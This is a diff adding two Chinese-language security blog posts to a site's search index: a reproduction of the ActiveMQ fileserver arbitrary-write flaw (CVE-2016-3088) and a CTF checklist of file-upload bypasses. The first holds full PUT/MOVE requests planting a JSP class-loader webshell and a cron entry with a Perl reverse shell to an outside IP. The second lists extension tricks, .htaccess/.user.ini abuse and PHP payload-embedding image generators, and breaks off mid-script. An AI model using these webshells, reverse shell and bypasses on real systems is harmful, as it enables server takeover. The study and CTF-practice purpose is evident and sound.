@@ -1,6 +1,279 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>ActActiveMQ Arbitrary File Write Vulnerability (CVE-2016-3088)</title>
+    <url>/2024/05/31/ActActiveMQ-Arbitrary-File-Write-Vulnerability-CVE-2016-3088/</url>
+    <content><![CDATA[<h1 id="器动"><a href="#器动" class="headerlink" title="器动"></a>器动</h1><span id="more"></span>
+
+<h1 id="漏洞版本"><a href="#漏洞版本" class="headerlink" title="漏洞版本"></a>漏洞版本</h1><p>5,14.0之前的版本</p>
+<p>5.12.x~5.13.x:需要开启fileserver应用(此应用默认关闭)</p>
+<h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><p>ActiveMQ的web控制台分三个应用，admin、api和fileserver，其中admin是管理员页面，api是接口，fileserver是储存文件的接口；admin和api都需要登录后才能使用，fileserver无需登录。</p>
+<p>fileserver是一个RESTful API接口，我们可以通过GET、PUT、DELETE等HTTP请求对其中存储的文件进行读写操作，其设计目的是为了弥补消息队列操作不能传输、存储二进制文件的缺陷。</p>
+<p>本漏洞出现在fileserver应用中，漏洞原理其实非常简单，就是fileserver支持写入文件（但不解析jsp），同时支持移动文件（MOVE请求）。所以，我们只需要写入一个文件，然后使用MOVE请求将其移动到任意位置，造成任意文件写入漏洞。</p>
+<h1 id="漏洞详细"><a href="#漏洞详细" class="headerlink" title="漏洞详细"></a>漏洞详细</h1><p>既然可以写入文件并且可以移动，那就会有下面四种方法，不过只能复现成功前两种，看了很多文章3,4好像也没什么人复现出来，而p神也只留下一句话：理论上可以，但尚未测试。。。。。。。。有种费马解费马大定理的美，然后我自己的功力当然也是做不到了的</p>
+<ol>
+<li>写入webshell</li>
+<li>写入cron</li>
+<li>写入jar或jetty.xml等库和配置文件</li>
+<li>写入ssh key</li>
+</ol>
+<h1 id="知识点学习"><a href="#知识点学习" class="headerlink" title="知识点学习"></a>知识点学习</h1><h2 id="PUT请求"><a href="#PUT请求" class="headerlink" title="PUT请求"></a>PUT请求</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p><code>PUT</code> 请求用于向服务器更新指定资源，可以理解为对服务器上的资源进行修改操作。使用 <code>PUT</code> 请求方式会覆盖原有的资源内容，因此需要谨慎使用。</p>
+<h3 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h3><p>本地一直没弄成功,PUT方法是一直被锁的</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240531142351189.png"  alt="image-20240531142351189"></p>
+<p><a class="link"   href="https://www.cnblogs.com/kuoaidebb/p/4466602.html" >HTTP - PUT 上传文件&#x2F;Shell - 阔爱的贝贝 - 博客园 (cnblogs.com)<i class="fas fa-external-link-alt"></i></a></p>
+<p>不过这put虽说可以上传，但是上传的目录是被锁死的，只要这个目录里不解析webshell也没辙，主要是这个Move有点伤</p>
+<h2 id="Move请求"><a href="#Move请求" class="headerlink" title="Move请求"></a>Move请求</h2><p><a class="link"   href="https://http-statuscode.com/zh/method/MOVE" >HTTP 方法: MOVE (http-statuscode.com)<i class="fas fa-external-link-alt"></i></a></p>
+<p>重要参数Destination</p>
+<h2 id="crontab"><a href="#crontab" class="headerlink" title="crontab"></a>crontab</h2><h3 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h3><p>linux上的定时任务</p>
+<p><a class="link"   href="https://www.runoob.com/w3cnote/linux-crontab-tasks.html" >Linux Crontab 定时任务 | 菜鸟教程 (runoob.com)<i class="fas fa-external-link-alt"></i></a></p>
+<h3 id="实验-1"><a href="#实验-1" class="headerlink" title="实验"></a>实验</h3><p><img   src="/../img/$%7Bfiilename%7D/image-20240531151440878.png"  alt="image-20240531151440878"></p>
+<p>每隔一分钟复制1.txt成2.txt到根目录，当然这个命令只能执行一次，因为不能同名吧，我主要想实验是发起任务的那一刻开启做，还是一分钟后开始做</p>
+<p>使用crontab命令是把定时任务设置在&#x2F;tmp&#x2F;crontab里的，名字随机，不好推出了并且写入</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240531152305281.png"  alt="image-20240531152305281"></p>
+<p>所以我们找到可以直接写入的<code>/etc/cron.d</code></p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240531152513931.png"  alt="image-20240531152513931"></p>
+<p>有三个用户，一般使用root用户</p>
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>开日</p>
+<h2 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h2><p><img   src="/../img/$%7Bfiilename%7D/image-20240531155110593.png"  alt="image-20240531155110593"></p>
+<p>弱口令爆破admin&#x2F;admin</p>
+<p>访问已经站点<code>http://your-ip:8161/admin/test/systemProperties.jsp</code>信息收集</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240531155345986.png"  alt="image-20240531155345986"></p>
+<p>我们只需要两个信息</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">activemq.base	/opt/activemq  #网站根目录，会解析jsp木马文件</span><br><span class="line">user.name	root               #/etc/cron.d目录所有者是root，若这里不是root估计打不成功</span><br></pre></td></tr></table></figure>
+
+<p>接着我们向fileserver上传文件</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">PUT</span> <span class="string">/fileserver/ewoji.txt</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>172.20.0.2:8161</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">If-Modified-Since</span><span class="punctuation">: </span>Fri, 13 Feb 2015 17:54:40 GMT</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>779</span><br><span class="line"></span><br><span class="line"><span class="language-gradle">&lt;%!</span></span><br><span class="line"><span class="language-gradle"><span class="keyword">class</span> U <span class="keyword">extends</span> ClassLoader &#123;</span></span><br><span class="line"><span class="language-gradle">U(ClassLoader c) &#123;</span></span><br><span class="line"><span class="language-gradle"><span class="keyword">super</span>(c);</span></span><br><span class="line"><span class="language-gradle">&#125;</span></span><br><span class="line"><span class="language-gradle"><span class="keyword">public</span> <span class="keyword">Class</span> g(<span class="keyword">byte</span>[] b) &#123;</span></span><br><span class="line"><span class="language-gradle"><span class="keyword">return</span> <span class="keyword">super</span>.defineClass(b, <span class="number">0</span>, b.length);</span></span><br><span class="line"><span class="language-gradle">&#125;</span></span><br><span class="line"><span class="language-gradle">&#125;</span></span><br><span class="line"><span class="language-gradle"> </span></span><br><span class="line"><span class="language-gradle"><span class="keyword">public</span> <span class="keyword">byte</span>[] base64Decode(String str) <span class="keyword">throws</span> Exception &#123;</span></span><br><span class="line"><span class="language-gradle"><span class="keyword">try</span> &#123;</span></span><br><span class="line"><span class="language-gradle"><span class="keyword">Class</span> clazz = <span class="keyword">Class</span>.forName(<span class="string">&quot;sun.misc.BASE64Decoder&quot;</span>);</span></span><br><span class="line"><span class="language-gradle"><span class="keyword">return</span> (<span class="keyword">byte</span>[]) clazz.getMethod(<span class="string">&quot;decodeBuffer&quot;</span>, String.<span class="keyword">class</span>).invoke(clazz.newInstance(), str);</span></span><br><span class="line"><span class="language-gradle">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span></span><br><span class="line"><span class="language-gradle"><span class="keyword">Class</span> clazz = <span class="keyword">Class</span>.forName(<span class="string">&quot;java.util.Base64&quot;</span>);</span></span><br><span class="line"><span class="language-gradle">Object decoder = clazz.getMethod(<span class="string">&quot;getDecoder&quot;</span>).invoke(<span class="keyword">null</span>);</span></span><br><span class="line"><span class="language-gradle"><span class="keyword">return</span> (<span class="keyword">byte</span>[]) decoder.getClass().getMethod(<span class="string">&quot;decode&quot;</span>, String.<span class="keyword">class</span>).invoke(decoder, str);</span></span><br><span class="line"><span class="language-gradle">&#125;</span></span><br><span class="line"><span class="language-gradle">&#125;</span></span><br><span class="line"><span class="language-gradle">%&gt;</span></span><br><span class="line"><span class="language-gradle">&lt;%</span></span><br><span class="line"><span class="language-gradle">String cls = request.getParameter(<span class="string">&quot;ewoji&quot;</span>);</span></span><br><span class="line"><span class="language-gradle"><span class="keyword">if</span> (cls != <span class="keyword">null</span>) &#123;</span></span><br><span class="line"><span class="language-gradle"><span class="keyword">new</span> U(<span class="keyword">this</span>.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);</span></span><br><span class="line"><span class="language-gradle">&#125;</span></span><br><span class="line"><span class="language-gradle">%&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>记住后缀不能是jsp</p>
+<p>接着Move</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">MOVE</span> <span class="string">/fileserver/ewoji.txt</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Destination</span><span class="punctuation">: </span>file:///opt/activemq/webapps/admin/ewoji.jsp</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>172.20.0.2:8161</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">If-Modified-Since</span><span class="punctuation">: </span>Fri, 13 Feb 2015 17:54:40 GMT</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>成功将木马打入</p>
+<p>注意这里ewoji.txt一定要和ewoji.jsp前缀名字相同，不然会把ewoji.jsp视为一个文件，fileserver会异常关闭，就打不了了呀</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240531215835511.png"  alt="image-20240531215835511"></p>
+<p>antsword启动</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240531161710100.png"  alt="image-20240531161710100"></p>
+<p>需要admin权限，记得加请求头</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240531161641254.png"  alt="image-20240531161641254"></p>
+<p>getshell !!!!</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240531221257330.png"  alt="image-20240531221257330"></p>
+<h2 id="写入crontab"><a href="#写入crontab" class="headerlink" title="写入crontab"></a>写入crontab</h2><p>大致和上面的一样，就是不用登录</p>
+<p>上传</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">PUT</span> <span class="string">/fileserver/ewoji1.txt</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>172.20.0.2:8161</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>250</span><br><span class="line"></span><br><span class="line"><span class="language-tcl">*/<span class="number">1</span> * * * * root /usr/bin/perl -e &#x27;use Socket;<span class="variable">$i</span>=<span class="string">&quot;47.100.177.241&quot;</span>;<span class="variable">$p</span>=<span class="number">23333</span>;<span class="keyword">socket</span>(S,PF_INET,SOCK_STREAM,getprotobyname(<span class="string">&quot;tcp&quot;</span>));<span class="keyword">if</span>(connect(S,sockaddr_in(<span class="variable">$p</span>,inet_aton(<span class="variable">$i</span>))))&#123;<span class="keyword">open</span>(STDIN,<span class="string">&quot;&gt;&amp;S&quot;</span>);<span class="keyword">open</span>(STDOUT,<span class="string">&quot;&gt;&amp;S&quot;</span>);<span class="keyword">open</span>(STDERR,<span class="string">&quot;&gt;&amp;S&quot;</span>);<span class="keyword">exec</span>(<span class="string">&quot;/bin/sh -i&quot;</span>);&#125;;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240606143921794.png"  alt="image-20240606143921794"></p>
+<p>如果是用bp，请确保正文最后是\n而不是\r\n</p>
+<p>移动</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">MOVE</span> <span class="string">/fileserver/ewoji1.txt</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Destination</span><span class="punctuation">: </span>file:///etc/cron.d/root</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>172.20.0.2:8161</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br></pre></td></tr></table></figure>
+
+<p>等待一下</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240606144408059.png"  alt="image-20240606144408059"></p>
+<p>getshell !!!</p>
+<h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p>1.对上传的文件内容进行检测</p>
+<p>2.限制move方法</p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>java</tag>
+        <tag>ActActiveMQ</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Checklist of upload</title>
+    <url>/2024/08/18/Checklist-of-upload/</url>
+    <content><![CDATA[<h1 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h1><span id="more"></span>
+
+<p>文件上传漏洞在CTF黑盒测试的时候我们基本上只能盲打，利用自己的经验和大量的fuzz才能解出，想给自己写个Checklist能让我在黑盒测试这类漏洞时能有一个完备和快速的测试吧</p>
+<h1 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h1><h2 id="寻找存储路径"><a href="#寻找存储路径" class="headerlink" title="寻找存储路径"></a>寻找存储路径</h2><ul>
+<li><p>根据题目直接知道</p>
+</li>
+<li><p>有回显图片，直接查看图片链接</p>
+</li>
+<li><p>目录爬虫，爬出存储路径</p>
+</li>
+</ul>
+<h2 id="解析的文件格式"><a href="#解析的文件格式" class="headerlink" title="解析的文件格式"></a>解析的文件格式</h2><p>我们并不知道服务器会解析什么文件时可以批量上传test文件看看是否解析</p>
+<ul>
+<li>php（apache）</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php echo 123;?&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>jsp（tomcat）</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%= 123%&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>asp（IIS）</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">        Dim number As Integer</span><br><span class="line">        number = 123</span><br><span class="line">        Response.Write(number)</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>前两个条件很快就可以判断出来，只需要先传入一张正常的文件一般就可以知道存储的路径，接着传入三个测试文件也就可以判断了</p>
+<p>重点还是绕过校验</p>
+<h1 id="图片校验"><a href="#图片校验" class="headerlink" title="图片校验"></a>图片校验</h1><h2 id="前端校验"><a href="#前端校验" class="headerlink" title="前端校验"></a>前端校验</h2><ul>
+<li>关闭js</li>
+<li>改包</li>
+</ul>
+<h2 id="后端校验"><a href="#后端校验" class="headerlink" title="后端校验"></a>后端校验</h2><h3 id="后缀名校验"><a href="#后缀名校验" class="headerlink" title="后缀名校验"></a>后缀名校验</h3><h4 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h4><p>把php，asp，jsp都列入黑名单</p>
+<h5 id="替代"><a href="#替代" class="headerlink" title="替代"></a>替代</h5><p>需要手动配置是否解析，不一定成功</p>
+<ul>
+<li>php</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php,php5,php4,php3,php2,pHp,pHp5,pHp4,pHp3,pHp2,html,htm,phtml,pht,Html,Htm,pHtml</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>jsp</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jsp,jspa,jspx,jsw,jsv,jspf,jtml,jSp,jSpx,jSpa,jSw,jSv,jSpf,jHtml</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>asp</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">asp,aspx,asa,asax,ascx,ashx,asmx,cer,aSp,aSpx,aSa,aSax,aScx,aShx,aSmx,cEr</span><br></pre></td></tr></table></figure>
+
+<h5 id="大小写"><a href="#大小写" class="headerlink" title="大小写"></a>大小写</h5><p>windows对大小写不敏感</p>
+<p>linux对大小写敏感</p>
+<h5 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h5><p>windows自动删掉空格</p>
+<h5 id="点绕过"><a href="#点绕过" class="headerlink" title="点绕过"></a>点绕过</h5><p>windows自动删掉点</p>
+<h5 id="DATA"><a href="#DATA" class="headerlink" title="::$DATA"></a>::$DATA</h5><p>windows自动删除后缀后的::$DATA</p>
+<h5 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h5><p>pphphp</p>
+<h5 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h5><p>move_uploaded_file遇到\x00字符后会截断路径名，在实现上存在安全漏洞</p>
+<p>使用限制:<br>1、php版本小于5.3.4<br>2、php.ini的magic_quotes_gpc为OFF状态</p>
+<h4 id="白名单"><a href="#白名单" class="headerlink" title="白名单"></a>白名单</h4><h5 id="图片马"><a href="#图片马" class="headerlink" title="图片马"></a>图片马</h5><p>图片最后插入一句话木马</p>
+<h6 id="再检验"><a href="#再检验" class="headerlink" title="再检验"></a>再检验</h6><ul>
+<li>伪造文件头</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">JPEG (jpg)，文件头：FFD8FF</span><br><span class="line">PNG (png)，文件头：89504E47</span><br><span class="line">GIF (gif)，文件头：47494638</span><br><span class="line">TIFF (tif)，文件头：49492A00</span><br><span class="line">Windows Bitmap (bmp)，文件头：424D</span><br><span class="line">CAD (dwg)，文件头：41433130</span><br><span class="line">Adobe Photoshop (psd)，文件头：38425053</span><br><span class="line">Rich Text Format (rtf)，文件头：7B5C727466</span><br><span class="line">XML (xml)，文件头：3C3F786D6C</span><br><span class="line">HTML (html)，文件头：68746D6C3E</span><br><span class="line">Email [thorough only] (eml)，文件头：44656C69766572792D646174653A</span><br><span class="line">Outlook Express (dbx)，文件头：CFAD12FEC5FD746F</span><br><span class="line">Outlook (pst)，文件头：2142444E</span><br><span class="line">MS Word/Excel (xls.or.doc)，文件头：D0CF11E0</span><br><span class="line">MS Access (mdb)，文件头：5374616E64617264204A</span><br><span class="line">WordPerfect (wpd)，文件头：FF575043</span><br><span class="line">Adobe Acrobat (pdf)，文件头：255044462D312E</span><br><span class="line">Quicken (qdf)，文件头：AC9EBD8F</span><br><span class="line">Windows Password (pwl)，文件头：E3828596</span><br><span class="line">ZIP Archive (zip)，文件头：504B0304</span><br><span class="line">RAR Archive (rar)，文件头：52617221</span><br><span class="line">Wave (wav)，文件头：57415645</span><br><span class="line">AVI (avi)，文件头：41564920</span><br><span class="line">Real Audio (ram)，文件头：2E7261FD</span><br><span class="line">Real Media (rm)，文件头：2E524D46</span><br><span class="line">MPEG (mpg)，文件头：000001BA</span><br><span class="line">MPEG (mpg)，文件头：000001B3</span><br><span class="line">Quicktime (mov)，文件头：6D6F6F76</span><br><span class="line">Windows Media (asf)，文件头：3026B2758E66CF11</span><br><span class="line">MIDI (mid)，文件头：4D546864</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>.htaccess解析</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg </span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>.user.ini（apache和Nginx都适用）</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// .user.ini</span><br><span class="line">auto_prepend_file = 1.jpg</span><br><span class="line">// 1.jpg</span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br><span class="line">// 1.php(任意php文件)</span><br></pre></td></tr></table></figure>
+
+<h6 id="二次渲染"><a href="#二次渲染" class="headerlink" title="二次渲染"></a>二次渲染</h6><ul>
+<li>GIF绕过</li>
+</ul>
+<p>寻找前后不变的地方插入一句话木马</p>
+<ul>
+<li>PNG绕过</li>
+</ul>
+<p>生成脚本</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">   <span class="variable">$color</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">   <span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">round</span>(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">imagepng</span>(<span class="variable">$img</span>,<span class="string">&#x27;./1.png&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>JPG绕过</li>
+</ul>
+<p>生成脚本</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$miniPayload</span> = <span class="string">&quot;&lt;?=phpinfo();?&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;gd&#x27;</span>) || !<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php-gd is not installed&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$argv</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">set_error_handler</span>(<span class="string">&quot;custom_error_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$pad</span> = <span class="number">0</span>; <span class="variable">$pad</span> &lt; <span class="number">1024</span>; <span class="variable">$pad</span>++) &#123;</span><br><span class="line">        <span class="variable">$nullbytePayloadSize</span> = <span class="variable">$pad</span>;</span><br><span class="line">        <span class="variable">$dis</span> = <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$outStream</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$extraBytes</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Incorrect SOI marker&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>()) &amp;&amp; (<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">            <span class="variable">$marker</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>();</span><br><span class="line">            <span class="variable">$size</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() - <span class="number">2</span>;</span><br><span class="line">            <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">skip</span>(<span class="variable">$size</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$marker</span> === <span class="number">0xDA</span>) &#123;</span><br><span class="line">                <span class="variable">$startPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>();</span><br><span class="line">                <span class="variable">$outStreamTmp</span> = </span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                    <span class="variable">$miniPayload</span> . </span><br><span class="line">                    <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>) . </span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, 